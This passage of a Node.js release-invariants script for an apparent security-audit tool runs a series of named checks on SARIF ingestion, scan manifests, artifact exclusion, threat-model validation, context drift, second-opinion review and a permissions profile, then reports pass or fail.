                  message: { text: 'Outside repo traversal' },
                  locations: [{ physicalLocation: { artifactLocation: { uri: '../../outside.js' }, region: { startLine: 1 } } }]
                }
              ]
            }
          ]
        };

        const ingested = ingestExternalEvidence(mockSarif, repoRoot);
        if (!ingested.success) {
          throw new Error(`ingestExternalEvidence failed: ${ingested.error}`);
        }
        if (ingested.parsedCount !== 4) {
          throw new Error(`Expected parsedCount 4, got ${ingested.parsedCount}`);
        }
        if (ingested.canonicalCount !== 3) {
          throw new Error(`Expected canonicalCount 3, got ${ingested.canonicalCount}`);
        }
        if (ingested.duplicateGeneratedCount !== 1) {
          throw new Error(`Expected duplicateGeneratedCount 1, got ${ingested.duplicateGeneratedCount}`);
        }
        if (ingested.boundCount !== 1) {
          throw new Error(`Expected boundCount 1, got ${ingested.boundCount}`);
        }
        if (ingested.unboundCount !== 2) {
          throw new Error(`Expected unboundCount 2, got ${ingested.unboundCount}`);
        }

        const f1 = ingested.findings.find(f => f.ruleId === 'MOCK-01' && f.evidenceBinding === 'BOUND');
        const fDup = ingested.findings.find(f => f.ruleId === 'MOCK-01' && f.evidenceBinding === 'GENERATED_DUPLICATE');
        const fMiss = ingested.findings.find(f => f.ruleId === 'MOCK-02');
        const fOut = ingested.findings.find(f => f.ruleId === 'MOCK-03');

        if (!f1 || !f1.evidenceHash) {
          throw new Error('Canonical finding MOCK-01 failed to bind evidenceHash');
        }
        if (!fDup) {
          throw new Error('Shadow context finding failed to classify as GENERATED_DUPLICATE');
        }
        if (!fMiss || fMiss.evidenceBinding !== 'UNBOUND_MISSING_FILE') {
          throw new Error('Missing file finding failed to classify as UNBOUND_MISSING_FILE');
        }
        if (!fOut || fOut.evidenceBinding !== 'OUTSIDE_SCOPE') {
          throw new Error('Traversal finding failed to classify as OUTSIDE_SCOPE');
        }
      }
    },
    {
      id: 'SEC-INV-31',
      name: 'Scan Lifecycle Manifest & Atomic Verdict Consistency (R9-P0-01)',
      check: () => {
        const m = buildScanManifest({ repoRoot });
        if (m.complete !== false || m.completedAt !== null) {
          throw new Error('New scan-manifest did not initialize with complete: false');
        }
        if (isAuthoritativeClean(m)) {
          throw new Error('isAuthoritativeClean accepted incomplete manifest (complete: false)');
        }
        const finalized = finalizeScan({
          candidates: [],
          manifest: m,
          repoRoot,
          auditIntent: 'REGRESSION',
          allowSelfAudit: true
        });
        if (finalized.manifest.complete !== true || !finalized.manifest.completedAt) {
          throw new Error('Finalized clean scan did not atomically set complete: true and completedAt');
        }
      }
    },
    {
      id: 'SEC-INV-32',
      name: 'Generated Analysis Artifacts Exclusion & Context Isolation (R9-P0-02)',
      check: () => {
        const catCodeql = categorizeDirectory('codeql-db');
        const catSemgrep = categorizeDirectory('.semgrep');
        const catCoverage = categorizeDirectory('coverage');
        const fileCodeql = classifyFile('codeql-db/db.json');
        if (catCodeql.status !== 'EXCLUDED_ANALYSIS_ARTIFACT' || catCodeql.kind !== 'EXCLUDED') {
          throw new Error(`codeql-db categorized as ${catCodeql.status} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
        }
        if (catSemgrep.status !== 'EXCLUDED_ANALYSIS_ARTIFACT') {
          throw new Error(`.semgrep categorized as ${catSemgrep.status} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
        }
        if (catCoverage.status !== 'EXCLUDED_ANALYSIS_ARTIFACT') {
          throw new Error(`coverage categorized as ${catCoverage.status} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
        }
        if (fileCodeql.classification !== 'EXCLUDED_ANALYSIS_ARTIFACT' || fileCodeql.isScanned !== false) {
          throw new Error(`codeql-db/db.json classified as ${fileCodeql.classification} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
        }
      }
    },
    {
      id: 'SEC-INV-33',
      name: 'Canonical Artifact Authority & Cross-Format Parity (R9-P0-03)',
      check: () => {
        const mismatchVerdict = validateCrossFormatParity({
          sarif: { runs: [{ properties: { canDeclareClean: true } }] },
          scanManifest: { canDeclareClean: false }
        });
        if (mismatchVerdict.valid) {
          throw new Error('validateCrossFormatParity accepted verdict mismatch');
        }

        const mismatchCounts = validateCrossFormatParity({
          sarif: { runs: [{ properties: { canDeclareClean: false, findingCounts: { reportable: 1, deferred: 0 } } }] },
          scanManifest: { canDeclareClean: false, findingCounts: { reportable: 0, deferred: 0 } }
        });
        if (mismatchCounts.valid) {
          throw new Error('validateCrossFormatParity accepted finding count mismatch');
        }

        const mismatchCoverage = validateCrossFormatParity({
          sarif: { runs: [{ properties: { coverageStatus: 'COMPLETE' } }] },
          coverage: { coverageStatus: 'PARTIAL' }
        });
        if (mismatchCoverage.valid) {
          throw new Error('validateCrossFormatParity accepted coverage status mismatch');
        }
      }
    },
    {
      id: 'SEC-INV-34',
      name: 'Component-Driven Threat Model Evidence & Quality Gate (R9-P1-02)',
      check: () => {
        const valInvalid = validateThreatModel({
          components: [{ id: 'MissingComp', evidence: ['nonexistent.js'] }],
          actors: [{ id: 'external-attacker', status: 'ASSUMPTION', source: 'UNKNOWN' }]
        }, repoRoot);
        if (valInvalid.valid) {
          throw new Error('validateThreatModel accepted component with non-existent evidence');
        }
        if (!valInvalid.warnings.some(w => w.includes('GENERIC_ACTOR_WITHOUT_EVIDENCE') || w.includes('generic actor without repository evidence'))) {
          throw new Error('validateThreatModel failed to emit quality warning for generic unevidenced actor');
        }
      }
    },
    {
      id: 'SEC-INV-35',
      name: 'Project Security Context Drift Detection & Assurance Boundary (R9-P1-01 & R9-P1-04)',
      check: () => {
        const base = { project: { entrypoints: ['a.js'], privilegedOperations: ['op1'] } };
        const driftEp = detectContextDrift({ project: { entrypoints: ['a.js', 'b.js'], privilegedOperations: ['op1'] } }, base);
        if (!driftEp.hasDrift || driftEp.status !== 'CONTEXT_DRIFT') {
          throw new Error('detectContextDrift failed to detect new entrypoint as CONTEXT_DRIFT');
        }
        const driftPriv = detectContextDrift({ project: { entrypoints: ['a.js'], privilegedOperations: ['op1', 'op2'] } }, base);
        if (!driftPriv.hasDrift || driftPriv.status !== 'THREAT_MODEL_REVIEW_REQUIRED') {
          throw new Error('detectContextDrift failed to detect new privileged operation as THREAT_MODEL_REVIEW_REQUIRED');
        }
      }
    },
    {
      id: 'SEC-INV-36',
      name: 'Sparse Component x Applicable Family Matrix Invariant (R10-P1-01)',
      check: () => {
        const testComp = [
          {
            id: 'CompA',
            applicableFamilies: ['filesystem/path/archive'],
            notApplicable: { 'network/SSRF': 'Local only' }
          }
        ];
        const testFam = ['filesystem/path/archive', 'network/SSRF', 'auth/authz/tenancy'];
        const matrix = generateDiscoveryMatrix(testComp, testFam);
        const cellApp = matrix.find(c => c.family === 'filesystem/path/archive');
        const cellExplicit = matrix.find(c => c.family === 'network/SSRF');
        const cellImplicit = matrix.find(c => c.family === 'auth/authz/tenancy');

        if (!cellApp || cellApp.status !== 'PENDING') {
          throw new Error('generateDiscoveryMatrix failed to yield PENDING for applicable family');
        }
        if (!cellExplicit || cellExplicit.status !== 'NOT_APPLICABLE' || !cellExplicit.reason.includes('Local only')) {
          throw new Error('generateDiscoveryMatrix failed to yield NOT_APPLICABLE with explicit reason');
        }
        if (!cellImplicit || cellImplicit.status !== 'NOT_APPLICABLE' || !cellImplicit.reason.includes('outside defined architectural scope')) {
          throw new Error('generateDiscoveryMatrix failed to yield NOT_APPLICABLE for unlisted family');
        }
      }
    },
    {
      id: 'SEC-INV-37',
      name: 'Confirmed Context Precedence, Quarantine, & Baseline Persistence Invariant (R10-P1-02 & R10-P1-03)',
      check: () => {
        // 1. Confirmed context threat model structure
        const tm = buildThreatModel(repoRoot);
        if (tm.contextStatus === 'CONFIRMED') {
          if (!tm.suggestedExtensions || !Array.isArray(tm.suggestedExtensions.components)) {
            throw new Error('buildThreatModel missing suggestedExtensions for confirmed context');
          }
          for (const s of tm.suggestedExtensions.components) {
            if (s.status !== 'AUTO_DISCOVERED_UNCONFIRMED') {
              throw new Error('Quarantined component lacks AUTO_DISCOVERED_UNCONFIRMED status');
            }
          }
        }

        // 2. Baseline persistence & loading
        const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-inv-37-base-'));
        try {
          const testBase = { projectId: 'inv-37', entrypoints: ['bin/cli.mjs'] };
          const pRes = persistBaselineContext(tmpDir, testBase);
          if (!pRes.success || !fs.existsSync(pRes.path)) {
            throw new Error('persistBaselineContext failed to persist baseline');
          }
          const lRes = loadBaselineContext(tmpDir);
          if (!lRes.exists || lRes.baseline?.projectId !== 'inv-37') {
            throw new Error('loadBaselineContext failed to retrieve persisted baseline');
          }
        } finally {
          fs.rmSync(tmpDir, { recursive: true, force: true });
        }
      }
    },
    {
      id: 'SEC-INV-38',
      name: 'Inventory Intake, Identity Precedence, & Second Opinion Invariant (R10-P1-04, R10-P1-05, R10-P1-06)',
      check: () => {
        // 1. evaluateSecondOpinion fail-closed on critical zero-candidate cell
        const critCell = { id: 'cell-crit', criticality: 'critical' };
        const nonCritCell = { id: 'cell-noncrit', criticality: 'low' };
        const zeroReview1 = { status: 'REVIEWED_NO_CANDIDATE', candidates: [], reviewedEvidence: [{ path: 'f.js', line: 1 }] };
        const zeroReview2 = { status: 'REVIEWED_NO_CANDIDATE', candidates: [], reviewedEvidence: [{ path: 'f.js', line: 2 }] };
        const candReview = { status: 'CANDIDATE', candidates: [{ id: 'C1', ruleId: 'CWE-89' }] };

        const evalNonCrit = evaluateSecondOpinion({ cell: nonCritCell, firstReview: zeroReview1 });
        if (evalNonCrit.required !== false || evalNonCrit.status !== 'NOT_REQUIRED') {
          throw new Error('evaluateSecondOpinion improperly required second opinion for non-critical cell');
        }

        const evalPending = evaluateSecondOpinion({ cell: critCell, firstReview: zeroReview1 });
        if (evalPending.required !== true || evalPending.status !== 'PENDING_SECOND_OPINION') {
          throw new Error('evaluateSecondOpinion failed to mandate second opinion for critical zero cell');
        }

        const evalAgreed = evaluateSecondOpinion({ cell: critCell, firstReview: zeroReview1, secondReview: zeroReview2 });
        if (evalAgreed.status !== 'CONFIRMED_ZERO_CANDIDATE' || evalAgreed.agreement !== true) {
          throw new Error('evaluateSecondOpinion failed to confirm unanimous zero-candidate outcome');
        }

        const evalEsc = evaluateSecondOpinion({ cell: critCell, firstReview: zeroReview1, secondReview: candReview });
        if (evalEsc.status !== 'ESCALATED_TO_CANDIDATE' || evalEsc.escalation !== true) {
          throw new Error('evaluateSecondOpinion failed to escalate dissenting candidate review');
        }

        // 2. Identity precedence: confirmed context > package.json > basename
        const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-inv-38-id-'));
        try {
          fs.mkdirSync(path.join(tmpDir, '.security-audit'), { recursive: true });
          fs.writeFileSync(path.join(tmpDir, '.security-audit', 'project.json'), JSON.stringify({ projectId: 'confirmed-proj-id', source: 'USER_CONFIRMED' }), 'utf8');
          fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'pkg-name-id' }), 'utf8');
          const m = buildScanManifest({ repoRoot: tmpDir });
          if (m.projectId !== 'confirmed-proj-id') {
            throw new Error(`buildScanManifest failed identity precedence: expected 'confirmed-proj-id', got '${m.projectId}'`);
          }
        } finally {
          fs.rmSync(tmpDir, { recursive: true, force: true });
        }
      }
    },
    {
      id: 'SEC-INV-39',
      name: 'Recommended Permissions Profile & 4-Layer Defense-in-Depth Invariant',
      check: () => {
        const profPath = path.resolve(repoRoot, 'recommended-security-audit-permissions.json');
        if (!fs.existsSync(profPath)) {
          throw new Error('recommended-security-audit-permissions.json missing from repository root');
        }
        const parsed = JSON.parse(fs.readFileSync(profPath, 'utf8'));
        const valRes = validatePermissionsProfile(parsed);
        if (!valRes.valid) {
          throw new Error(`recommended-security-audit-permissions.json failed validation: ${valRes.errors.join('; ')}`);
        }
        const schemaPath = path.resolve(repoRoot, 'schemas/permissions-profile.schema.json');
        if (!fs.existsSync(schemaPath)) {
          throw new Error('schemas/permissions-profile.schema.json missing');
        }
        const schemaParsed = JSON.parse(fs.readFileSync(schemaPath, 'utf8'));
        if (!schemaParsed.$schema || !schemaParsed.properties?.defenseInDepth || !schemaParsed.properties?.roles) {
          throw new Error('schemas/permissions-profile.schema.json missing required schema structure');
        }
        const secPath = path.resolve(repoRoot, 'SECURITY.md');
        const secContent = fs.readFileSync(secPath, 'utf8');
        if (!secContent.includes('4-Layer Defense-in-Depth Execution Model')) {
          throw new Error('SECURITY.md missing Section 2.8 4-Layer Defense-in-Depth Execution Model');
        }
      }
    },
    {
      id: 'SEC-INV-40',
      name: 'AGY Custom-Agent Contract Conformance Invariant',
      check: () => {
        const agentsDir = path.resolve(repoRoot, 'agents');
        const validation = validateAllAgentContracts(agentsDir);
        if (!validation.valid) {
          throw new Error(`Agent contract validation failed: ${validation.errors.join('; ')}`);
        }
      }
    }
  ];

  for (const inv of securityInvariants) {
    try {
      inv.check();
    } catch (err) {
      errors.push(`Security Invariant Violation [${inv.id}: ${inv.name}]: ${err.message}`);
    }
  }

  return {
    passed: errors.length === 0,
    errors,
    warnings,
    verifiedFilesCount: REQUIRED_FILES.length,
    verifiedInvariantsCount: securityInvariants.length
  };

}

// -----------------------------------------------------------------------------
// CLI Dispatch
// -----------------------------------------------------------------------------
const isDirectExecution = process.argv[1] && process.argv[1].endsWith('check-release-invariants.mjs');

if (isDirectExecution) {
  console.log('Validating Section 24 Release Invariants Gate...');
  const result = checkReleaseInvariants(process.cwd());

  if (!result.passed) {
    console.error(`\n❌ Release Invariants Gate FAILED with ${result.errors.length} error(s):`);
    for (const err of result.errors) {
      console.error(`  - ${err}`);
    }
    process.exit(1);
  }

  console.log(`\n✔ Release Invariants Gate PASSED! (${result.verifiedFilesCount} required specifications and scripts verified, ${result.verifiedInvariantsCount} authoritative security invariants verified, 0 external dependencies, all automated invariants green).`);
}


